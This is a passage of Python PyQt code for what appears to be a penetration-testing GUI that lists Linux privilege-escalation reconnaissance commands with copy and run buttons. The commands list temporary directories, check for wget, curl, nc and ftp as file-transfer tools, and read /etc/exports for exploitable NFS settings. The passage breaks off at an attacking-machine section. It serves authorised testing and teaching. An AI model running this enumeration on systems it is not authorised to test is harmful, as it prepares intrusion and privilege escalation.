        # lpe_misc_files_Scan2 run button
        if hasattr(self, 'lpe_misc_files_Scan2_Run'):
            self.tab3_container_layout.removeWidget(self.lpe_misc_files_Scan2_Run)
            self.lpe_misc_files_Scan2_Run.deleteLater()
        self.lpe_misc_files_Scan2_Run = QPushButton()
        self.lpe_misc_files_Scan2_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.lpe_misc_files_Scan2_Run.setFixedSize(QSize(20,20))
        command10 = self.lpe_misc_files_Scan2.text() + "; bash"
        self.lpe_misc_files_Scan2_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.lpe_misc_files_Scan2_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_misc_files_Scan2 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.lpe_misc_files_Scan2_Copy)
        label_layout.addWidget(self.lpe_misc_files_Scan2_Run)
        label_layout.addWidget(self.lpe_misc_files_Scan2)
        self.tab3_container_layout.insertLayout(100, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_misc_files_Scan3
        if hasattr(self, 'lpe_misc_files_Scan3'):
            self.tab3_container_layout.removeWidget(self.lpe_misc_files_Scan3)
            self.lpe_misc_files_Scan3.deleteLater()
        self.lpe_misc_files_Scan3 = QLabel(f"ls -lsaht /opt/")
        self.lpe_misc_files_Scan3.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # lpe_misc_files_Scan3 copy button
        if hasattr(self, 'lpe_misc_files_Scan3_Copy'):
            self.tab3_container_layout.removeWidget(self.lpe_misc_files_Scan3_Copy)
            self.lpe_misc_files_Scan3_Copy.deleteLater()
        self.lpe_misc_files_Scan3_Copy = QPushButton()
        self.lpe_misc_files_Scan3_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.lpe_misc_files_Scan3_Copy.setFixedSize(QSize(20,20))
        self.lpe_misc_files_Scan3_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.lpe_misc_files_Scan3.text()))
        self.lpe_misc_files_Scan3_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_misc_files_Scan3 run button
        if hasattr(self, 'lpe_misc_files_Scan3_Run'):
            self.tab3_container_layout.removeWidget(self.lpe_misc_files_Scan3_Run)
            self.lpe_misc_files_Scan3_Run.deleteLater()
        self.lpe_misc_files_Scan3_Run = QPushButton()
        self.lpe_misc_files_Scan3_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.lpe_misc_files_Scan3_Run.setFixedSize(QSize(20,20))
        command10 = self.lpe_misc_files_Scan3.text() + "; bash"
        self.lpe_misc_files_Scan3_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.lpe_misc_files_Scan3_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_misc_files_Scan3 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.lpe_misc_files_Scan3_Copy)
        label_layout.addWidget(self.lpe_misc_files_Scan3_Run)
        label_layout.addWidget(self.lpe_misc_files_Scan3)
        self.tab3_container_layout.insertLayout(101, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_misc_files_Scan4
        if hasattr(self, 'lpe_misc_files_Scan4'):
            self.tab3_container_layout.removeWidget(self.lpe_misc_files_Scan4)
            self.lpe_misc_files_Scan4.deleteLater()
        self.lpe_misc_files_Scan4 = QLabel(f"ls -lsaht /tmp/")
        self.lpe_misc_files_Scan4.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # lpe_misc_files_Scan4 copy button
        if hasattr(self, 'lpe_misc_files_Scan4_Copy'):
            self.tab3_container_layout.removeWidget(self.lpe_misc_files_Scan4_Copy)
            self.lpe_misc_files_Scan4_Copy.deleteLater()
        self.lpe_misc_files_Scan4_Copy = QPushButton()
        self.lpe_misc_files_Scan4_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.lpe_misc_files_Scan4_Copy.setFixedSize(QSize(20,20))
        self.lpe_misc_files_Scan4_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.lpe_misc_files_Scan4.text()))
        self.lpe_misc_files_Scan4_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_misc_files_Scan4 run button
        if hasattr(self, 'lpe_misc_files_Scan4_Run'):
            self.tab3_container_layout.removeWidget(self.lpe_misc_files_Scan4_Run)
            self.lpe_misc_files_Scan4_Run.deleteLater()
        self.lpe_misc_files_Scan4_Run = QPushButton()
        self.lpe_misc_files_Scan4_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.lpe_misc_files_Scan4_Run.setFixedSize(QSize(20,20))
        command10 = self.lpe_misc_files_Scan4.text() + "; bash"
        self.lpe_misc_files_Scan4_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.lpe_misc_files_Scan4_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_misc_files_Scan4 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.lpe_misc_files_Scan4_Copy)
        label_layout.addWidget(self.lpe_misc_files_Scan4_Run)
        label_layout.addWidget(self.lpe_misc_files_Scan4)
        self.tab3_container_layout.insertLayout(102, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_misc_files_Scan5
        if hasattr(self, 'lpe_misc_files_Scan5'):
            self.tab3_container_layout.removeWidget(self.lpe_misc_files_Scan5)
            self.lpe_misc_files_Scan5.deleteLater()
        self.lpe_misc_files_Scan5 = QLabel(f"ls -lsaht /var/tmp/")
        self.lpe_misc_files_Scan5.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # lpe_misc_files_Scan5 copy button
        if hasattr(self, 'lpe_misc_files_Scan5_Copy'):
            self.tab3_container_layout.removeWidget(self.lpe_misc_files_Scan5_Copy)
            self.lpe_misc_files_Scan5_Copy.deleteLater()
        self.lpe_misc_files_Scan5_Copy = QPushButton()
        self.lpe_misc_files_Scan5_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.lpe_misc_files_Scan5_Copy.setFixedSize(QSize(20,20))
        self.lpe_misc_files_Scan5_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.lpe_misc_files_Scan5.text()))
        self.lpe_misc_files_Scan5_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_misc_files_Scan5 run button
        if hasattr(self, 'lpe_misc_files_Scan5_Run'):
            self.tab3_container_layout.removeWidget(self.lpe_misc_files_Scan5_Run)
            self.lpe_misc_files_Scan5_Run.deleteLater()
        self.lpe_misc_files_Scan5_Run = QPushButton()
        self.lpe_misc_files_Scan5_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.lpe_misc_files_Scan5_Run.setFixedSize(QSize(20,20))
        command10 = self.lpe_misc_files_Scan5.text() + "; bash"
        self.lpe_misc_files_Scan5_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.lpe_misc_files_Scan5_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_misc_files_Scan5 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.lpe_misc_files_Scan5_Copy)
        label_layout.addWidget(self.lpe_misc_files_Scan5_Run)
        label_layout.addWidget(self.lpe_misc_files_Scan5)
        self.tab3_container_layout.insertLayout(103, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_misc_files_Scan6
        if hasattr(self, 'lpe_misc_files_Scan6'):
            self.tab3_container_layout.removeWidget(self.lpe_misc_files_Scan6)
            self.lpe_misc_files_Scan6.deleteLater()
        self.lpe_misc_files_Scan6 = QLabel(f"ls -lsaht /dev/shm/")
        self.lpe_misc_files_Scan6.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # lpe_misc_files_Scan6 copy button
        if hasattr(self, 'lpe_misc_files_Scan6_Copy'):
            self.tab3_container_layout.removeWidget(self.lpe_misc_files_Scan6_Copy)
            self.lpe_misc_files_Scan6_Copy.deleteLater()
        self.lpe_misc_files_Scan6_Copy = QPushButton()
        self.lpe_misc_files_Scan6_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.lpe_misc_files_Scan6_Copy.setFixedSize(QSize(20,20))
        self.lpe_misc_files_Scan6_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.lpe_misc_files_Scan6.text()))
        self.lpe_misc_files_Scan6_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_misc_files_Scan6 run button
        if hasattr(self, 'lpe_misc_files_Scan6_Run'):
            self.tab3_container_layout.removeWidget(self.lpe_misc_files_Scan6_Run)
            self.lpe_misc_files_Scan6_Run.deleteLater()
        self.lpe_misc_files_Scan6_Run = QPushButton()
        self.lpe_misc_files_Scan6_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.lpe_misc_files_Scan6_Run.setFixedSize(QSize(20,20))
        command10 = self.lpe_misc_files_Scan6.text() + "; bash"
        self.lpe_misc_files_Scan6_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.lpe_misc_files_Scan6_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_misc_files_Scan6 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.lpe_misc_files_Scan6_Copy)
        label_layout.addWidget(self.lpe_misc_files_Scan6_Run)
        label_layout.addWidget(self.lpe_misc_files_Scan6)
        self.tab3_container_layout.insertLayout(104, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_misc_files_divider 1
        if hasattr(self, 'lpe_misc_files_divider1'):
            self.tab3_container_layout.removeWidget(self.lpe_misc_files_divider1)
            self.lpe_misc_files_divider1.deleteLater()
        self.lpe_misc_files_divider1 = QFrame()
        self.lpe_misc_files_divider1.setFrameShape(QFrame.HLine)
        self.lpe_misc_files_divider1.setLineWidth(3)
        self.lpe_misc_files_divider1.setStyleSheet("color: #20C20E;")

        # lpe_misc_files_divider2
        if hasattr(self, 'lpe_misc_files_divider2'):
            self.tab3_container_layout.removeWidget(self.lpe_misc_files_divider2)
            self.lpe_misc_files_divider2.deleteLater()
        self.lpe_misc_files_divider2 = QFrame()
        self.lpe_misc_files_divider2.setFrameShape(QFrame.HLine)
        self.lpe_misc_files_divider2.setLineWidth(3)
        self.lpe_misc_files_divider2.setStyleSheet("color: #20C20E;")

        # lpe_misc_files_spacer1
        if hasattr(self, 'lpe_misc_files_spacer1'):
            self.tab3_container_layout.removeWidget(self.lpe_misc_files_spacer1)
            self.lpe_misc_files_spacer1.deleteLater()
        self.lpe_misc_files_spacer1 = QLabel()
        self.lpe_misc_files_spacer1.setFixedWidth(40)
        self.lpe_misc_files_spacer1.setFixedHeight(50)

        # lpe_misc_files_spacer2
        if hasattr(self, 'lpe_misc_files_spacer2'):
            self.tab3_container_layout.removeWidget(self.lpe_misc_files_spacer2)
            self.lpe_misc_files_spacer2.deleteLater()
        self.lpe_misc_files_spacer2 = QLabel()
        self.lpe_misc_files_spacer2.setFixedWidth(40)
        self.lpe_misc_files_spacer2.setFixedHeight(50)

        # lpe_misc_files_spacer & divider layout
        self.tab3_container_layout.insertWidget(105, self.lpe_misc_files_spacer1)
        self.tab3_container_layout.insertWidget(106, self.lpe_misc_files_divider1)
        self.tab3_container_layout.insertWidget(107, self.lpe_misc_files_divider2)
        self.tab3_container_layout.insertWidget(108, self.lpe_misc_files_spacer2)
        self.tab3_container_layout.addStretch()

# lpe_fileTransfer
        if hasattr(self, 'lpe_fileTransfer'):
            self.tab3_container_layout.removeWidget(self.lpe_fileTransfer)
            self.lpe_fileTransfer.deleteLater()
        self.lpe_fileTransfer = QLabel("[+ File Transfer Capability?]")
        self.lpe_fileTransfer.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab3_container_layout.insertWidget(109,self.lpe_fileTransfer)

        # lpe_fileTransfer_Scan1
        if hasattr(self, 'lpe_fileTransfer_Scan1'):
            self.tab3_container_layout.removeWidget(self.lpe_fileTransfer_Scan1)
            self.lpe_fileTransfer_Scan1.deleteLater()
        self.lpe_fileTransfer_Scan1 = QLabel(f"which wget")
        self.lpe_fileTransfer_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # lpe_fileTransfer_Scan1 copy button
        if hasattr(self, 'lpe_fileTransfer_Scan1_Copy'):
            self.tab3_container_layout.removeWidget(self.lpe_fileTransfer_Scan1_Copy)
            self.lpe_fileTransfer_Scan1_Copy.deleteLater()
        self.lpe_fileTransfer_Scan1_Copy = QPushButton()
        self.lpe_fileTransfer_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.lpe_fileTransfer_Scan1_Copy.setFixedSize(QSize(20,20))
        self.lpe_fileTransfer_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.lpe_fileTransfer_Scan1.text()))
        self.lpe_fileTransfer_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_fileTransfer_Scan1 run button
        if hasattr(self, 'lpe_fileTransfer_Scan1_Run'):
            self.tab3_container_layout.removeWidget(self.lpe_fileTransfer_Scan1_Run)
            self.lpe_fileTransfer_Scan1_Run.deleteLater()
        self.lpe_fileTransfer_Scan1_Run = QPushButton()
        self.lpe_fileTransfer_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.lpe_fileTransfer_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.lpe_fileTransfer_Scan1.text() + "; bash"
        self.lpe_fileTransfer_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.lpe_fileTransfer_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_fileTransfer_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.lpe_fileTransfer_Scan1_Copy)
        label_layout.addWidget(self.lpe_fileTransfer_Scan1_Run)
        label_layout.addWidget(self.lpe_fileTransfer_Scan1)
        self.tab3_container_layout.insertLayout(110, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_fileTransfer_Scan2
        if hasattr(self, 'lpe_fileTransfer_Scan2'):
            self.tab3_container_layout.removeWidget(self.lpe_fileTransfer_Scan2)
            self.lpe_fileTransfer_Scan2.deleteLater()
        self.lpe_fileTransfer_Scan2 = QLabel(f"which curl")
        self.lpe_fileTransfer_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # lpe_fileTransfer_Scan2 copy button
        if hasattr(self, 'lpe_fileTransfer_Scan2_Copy'):
            self.tab3_container_layout.removeWidget(self.lpe_fileTransfer_Scan2_Copy)
            self.lpe_fileTransfer_Scan2_Copy.deleteLater()
        self.lpe_fileTransfer_Scan2_Copy = QPushButton()
        self.lpe_fileTransfer_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.lpe_fileTransfer_Scan2_Copy.setFixedSize(QSize(20,20))
        self.lpe_fileTransfer_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.lpe_fileTransfer_Scan2.text()))
        self.lpe_fileTransfer_Scan2_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_fileTransfer_Scan2 run button
        if hasattr(self, 'lpe_fileTransfer_Scan2_Run'):
            self.tab3_container_layout.removeWidget(self.lpe_fileTransfer_Scan2_Run)
            self.lpe_fileTransfer_Scan2_Run.deleteLater()
        self.lpe_fileTransfer_Scan2_Run = QPushButton()
        self.lpe_fileTransfer_Scan2_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.lpe_fileTransfer_Scan2_Run.setFixedSize(QSize(20,20))
        command10 = self.lpe_fileTransfer_Scan2.text() + "; bash"
        self.lpe_fileTransfer_Scan2_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.lpe_fileTransfer_Scan2_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_fileTransfer_Scan2 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.lpe_fileTransfer_Scan2_Copy)
        label_layout.addWidget(self.lpe_fileTransfer_Scan2_Run)
        label_layout.addWidget(self.lpe_fileTransfer_Scan2)
        self.tab3_container_layout.insertLayout(111, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_fileTransfer_Scan3
        if hasattr(self, 'lpe_fileTransfer_Scan3'):
            self.tab3_container_layout.removeWidget(self.lpe_fileTransfer_Scan3)
            self.lpe_fileTransfer_Scan3.deleteLater()
        self.lpe_fileTransfer_Scan3 = QLabel(f"which nc")
        self.lpe_fileTransfer_Scan3.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # lpe_fileTransfer_Scan3 copy button
        if hasattr(self, 'lpe_fileTransfer_Scan3_Copy'):
            self.tab3_container_layout.removeWidget(self.lpe_fileTransfer_Scan3_Copy)
            self.lpe_fileTransfer_Scan3_Copy.deleteLater()
        self.lpe_fileTransfer_Scan3_Copy = QPushButton()
        self.lpe_fileTransfer_Scan3_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.lpe_fileTransfer_Scan3_Copy.setFixedSize(QSize(20,20))
        self.lpe_fileTransfer_Scan3_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.lpe_fileTransfer_Scan3.text()))
        self.lpe_fileTransfer_Scan3_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_fileTransfer_Scan3 run button
        if hasattr(self, 'lpe_fileTransfer_Scan3_Run'):
            self.tab3_container_layout.removeWidget(self.lpe_fileTransfer_Scan3_Run)
            self.lpe_fileTransfer_Scan3_Run.deleteLater()
        self.lpe_fileTransfer_Scan3_Run = QPushButton()
        self.lpe_fileTransfer_Scan3_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.lpe_fileTransfer_Scan3_Run.setFixedSize(QSize(20,20))
        command10 = self.lpe_fileTransfer_Scan3.text() + "; bash"
        self.lpe_fileTransfer_Scan3_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.lpe_fileTransfer_Scan3_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_fileTransfer_Scan3 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.lpe_fileTransfer_Scan3_Copy)
        label_layout.addWidget(self.lpe_fileTransfer_Scan3_Run)
        label_layout.addWidget(self.lpe_fileTransfer_Scan3)
        self.tab3_container_layout.insertLayout(112, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_fileTransfer_Scan4
        if hasattr(self, 'lpe_fileTransfer_Scan4'):
            self.tab3_container_layout.removeWidget(self.lpe_fileTransfer_Scan4)
            self.lpe_fileTransfer_Scan4.deleteLater()
        self.lpe_fileTransfer_Scan4 = QLabel(f"which fetch")
        self.lpe_fileTransfer_Scan4.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # lpe_fileTransfer_Scan4 copy button
        if hasattr(self, 'lpe_fileTransfer_Scan4_Copy'):
            self.tab3_container_layout.removeWidget(self.lpe_fileTransfer_Scan4_Copy)
            self.lpe_fileTransfer_Scan4_Copy.deleteLater()
        self.lpe_fileTransfer_Scan4_Copy = QPushButton()
        self.lpe_fileTransfer_Scan4_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.lpe_fileTransfer_Scan4_Copy.setFixedSize(QSize(20,20))
        self.lpe_fileTransfer_Scan4_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.lpe_fileTransfer_Scan4.text()))
        self.lpe_fileTransfer_Scan4_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_fileTransfer_Scan4 run button
        if hasattr(self, 'lpe_fileTransfer_Scan4_Run'):
            self.tab3_container_layout.removeWidget(self.lpe_fileTransfer_Scan4_Run)
            self.lpe_fileTransfer_Scan4_Run.deleteLater()
        self.lpe_fileTransfer_Scan4_Run = QPushButton()
        self.lpe_fileTransfer_Scan4_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.lpe_fileTransfer_Scan4_Run.setFixedSize(QSize(20,20))
        command10 = self.lpe_fileTransfer_Scan4.text() + "; bash"
        self.lpe_fileTransfer_Scan4_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.lpe_fileTransfer_Scan4_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_fileTransfer_Scan4 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.lpe_fileTransfer_Scan4_Copy)
        label_layout.addWidget(self.lpe_fileTransfer_Scan4_Run)
        label_layout.addWidget(self.lpe_fileTransfer_Scan4)
        self.tab3_container_layout.insertLayout(113, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_fileTransfer_Scan5
        if hasattr(self, 'lpe_fileTransfer_Scan5'):
            self.tab3_container_layout.removeWidget(self.lpe_fileTransfer_Scan5)
            self.lpe_fileTransfer_Scan5.deleteLater()
        self.lpe_fileTransfer_Scan5 = QLabel(f"ls -lsaht /bin/ |grep -i 'ftp' --color=auto")
        self.lpe_fileTransfer_Scan5.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # lpe_fileTransfer_Scan5 copy button
        if hasattr(self, 'lpe_fileTransfer_Scan5_Copy'):
            self.tab3_container_layout.removeWidget(self.lpe_fileTransfer_Scan5_Copy)
            self.lpe_fileTransfer_Scan5_Copy.deleteLater()
        self.lpe_fileTransfer_Scan5_Copy = QPushButton()
        self.lpe_fileTransfer_Scan5_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.lpe_fileTransfer_Scan5_Copy.setFixedSize(QSize(20,20))
        self.lpe_fileTransfer_Scan5_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.lpe_fileTransfer_Scan5.text()))
        self.lpe_fileTransfer_Scan5_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_fileTransfer_Scan5 run button
        if hasattr(self, 'lpe_fileTransfer_Scan5_Run'):
            self.tab3_container_layout.removeWidget(self.lpe_fileTransfer_Scan5_Run)
            self.lpe_fileTransfer_Scan5_Run.deleteLater()
        self.lpe_fileTransfer_Scan5_Run = QPushButton()
        self.lpe_fileTransfer_Scan5_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.lpe_fileTransfer_Scan5_Run.setFixedSize(QSize(20,20))
        command10 = self.lpe_fileTransfer_Scan5.text() + "; bash"
        self.lpe_fileTransfer_Scan5_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.lpe_fileTransfer_Scan5_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_fileTransfer_Scan5 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.lpe_fileTransfer_Scan5_Copy)
        label_layout.addWidget(self.lpe_fileTransfer_Scan5_Run)
        label_layout.addWidget(self.lpe_fileTransfer_Scan5)
        self.tab3_container_layout.insertLayout(114, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_fileTransfer_divider 1
        if hasattr(self, 'lpe_fileTransfer_divider1'):
            self.tab3_container_layout.removeWidget(self.lpe_fileTransfer_divider1)
            self.lpe_fileTransfer_divider1.deleteLater()
        self.lpe_fileTransfer_divider1 = QFrame()
        self.lpe_fileTransfer_divider1.setFrameShape(QFrame.HLine)
        self.lpe_fileTransfer_divider1.setLineWidth(3)
        self.lpe_fileTransfer_divider1.setStyleSheet("color: #20C20E;")

        # lpe_fileTransfer_divider2
        if hasattr(self, 'lpe_fileTransfer_divider2'):
            self.tab3_container_layout.removeWidget(self.lpe_fileTransfer_divider2)
            self.lpe_fileTransfer_divider2.deleteLater()
        self.lpe_fileTransfer_divider2 = QFrame()
        self.lpe_fileTransfer_divider2.setFrameShape(QFrame.HLine)
        self.lpe_fileTransfer_divider2.setLineWidth(3)
        self.lpe_fileTransfer_divider2.setStyleSheet("color: #20C20E;")

        # lpe_fileTransfer_spacer1
        if hasattr(self, 'lpe_fileTransfer_spacer1'):
            self.tab3_container_layout.removeWidget(self.lpe_fileTransfer_spacer1)
            self.lpe_fileTransfer_spacer1.deleteLater()
        self.lpe_fileTransfer_spacer1 = QLabel()
        self.lpe_fileTransfer_spacer1.setFixedWidth(40)
        self.lpe_fileTransfer_spacer1.setFixedHeight(50)

        # lpe_fileTransfer_spacer2
        if hasattr(self, 'lpe_fileTransfer_spacer2'):
            self.tab3_container_layout.removeWidget(self.lpe_fileTransfer_spacer2)
            self.lpe_fileTransfer_spacer2.deleteLater()
        self.lpe_fileTransfer_spacer2 = QLabel()
        self.lpe_fileTransfer_spacer2.setFixedWidth(40)
        self.lpe_fileTransfer_spacer2.setFixedHeight(50)

        # lpe_fileTransfer_spacer & divider layout
        self.tab3_container_layout.insertWidget(115, self.lpe_fileTransfer_spacer1)
        self.tab3_container_layout.insertWidget(116, self.lpe_fileTransfer_divider1)
        self.tab3_container_layout.insertWidget(117, self.lpe_fileTransfer_divider2)
        self.tab3_container_layout.insertWidget(118, self.lpe_fileTransfer_spacer2)
        self.tab3_container_layout.addStretch()

# lpe_NFS
        if hasattr(self, 'lpe_NFS'):
            self.tab3_container_layout.removeWidget(self.lpe_NFS)
            self.lpe_NFS.deleteLater()
        self.lpe_NFS = QLabel("[+ Can we exploit weak NFS Permissions?]")
        self.lpe_NFS.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab3_container_layout.insertWidget(119,self.lpe_NFS)

        # lpe_NFS_Scan1
        if hasattr(self, 'lpe_NFS_Scan1'):
            self.tab3_container_layout.removeWidget(self.lpe_NFS_Scan1)
            self.lpe_NFS_Scan1.deleteLater()
        self.lpe_NFS_Scan1 = QLabel(f"cat /etc/exports")
        self.lpe_NFS_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # lpe_NFS_Scan1 copy button
        if hasattr(self, 'lpe_NFS_Scan1_Copy'):
            self.tab3_container_layout.removeWidget(self.lpe_NFS_Scan1_Copy)
            self.lpe_NFS_Scan1_Copy.deleteLater()
        self.lpe_NFS_Scan1_Copy = QPushButton()
        self.lpe_NFS_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.lpe_NFS_Scan1_Copy.setFixedSize(QSize(20,20))
        self.lpe_NFS_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.lpe_NFS_Scan1.text()))
        self.lpe_NFS_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_NFS_Scan1 run button
        if hasattr(self, 'lpe_NFS_Scan1_Run'):
            self.tab3_container_layout.removeWidget(self.lpe_NFS_Scan1_Run)
            self.lpe_NFS_Scan1_Run.deleteLater()
        self.lpe_NFS_Scan1_Run = QPushButton()
        self.lpe_NFS_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.lpe_NFS_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.lpe_NFS_Scan1.text() + "; bash"
        self.lpe_NFS_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.lpe_NFS_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_NFS_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.lpe_NFS_Scan1_Copy)
        label_layout.addWidget(self.lpe_NFS_Scan1_Run)
        label_layout.addWidget(self.lpe_NFS_Scan1)
        self.tab3_container_layout.insertLayout(120, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_NFS_Scan2
        if hasattr(self, 'lpe_NFS_Scan2'):
            self.tab3_container_layout.removeWidget(self.lpe_NFS_Scan2)
            self.lpe_NFS_Scan2.deleteLater()
        self.lpe_NFS_Scan2 = QLabel("no_root_squash")
        self.lpe_NFS_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # lpe_NFS_Scan2 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.lpe_NFS_Scan2)
        self.tab3_container_layout.insertLayout(121, label_layout)
        self.tab3_container_layout.addStretch()

	# lpe_NFS1_spacer1
        if hasattr(self, 'lpe_NFS1_spacer1'):
            self.tab3_container_layout.removeWidget(self.lpe_NFS1_spacer1)
            self.lpe_NFS1_spacer1.deleteLater()
        self.lpe_NFS1_spacer1 = QLabel()
        self.lpe_NFS1_spacer1.setFixedWidth(40)
        self.lpe_NFS1_spacer1.setFixedHeight(50)

        # lpe_NFS1_spacer & divider layout
        self.tab3_container_layout.insertWidget(122, self.lpe_NFS1_spacer1)
        self.tab3_container_layout.addStretch()

	# lpe_NFS_exploitHost
        if hasattr(self, 'lpe_NFS_exploitHost'):
            self.tab3_container_layout.removeWidget(self.lpe_NFS_exploitHost)
            self.lpe_NFS_exploitHost.deleteLater()
        self.lpe_NFS_exploitHost = QLabel("[On Attacking Machine]")
        self.lpe_NFS_exploitHost.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
